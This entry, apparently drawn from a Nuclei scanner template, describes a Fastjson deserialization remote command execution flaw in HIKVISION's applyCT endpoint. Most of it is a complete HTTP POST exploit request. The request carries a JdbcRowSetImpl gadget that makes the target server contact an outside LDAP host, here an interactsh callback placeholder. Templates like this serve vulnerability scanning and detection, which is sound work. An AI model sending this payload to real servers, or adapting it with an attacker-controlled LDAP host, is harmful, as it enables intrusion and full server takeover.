# Vulnerability: HIKVISION applyCT Fastjson - Remote Command Execution
**Classification:** CWE-94,CWE-502
**Source:** Nuclei Template (`hikvision-fastjson-rce.yaml`)

## Description
The HIKVISION comprehensive security management platform applyCT has a remote command execution vulnerability in a low version of Fastjson, through which an attacker can execute arbitrary commands to obtain server privileges

## Vulnerable Code Pattern / Exploit Payload
```http
POST /bic/ssoService/v1/applyCT HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true},"hfe4zyyzldp":"="}
```

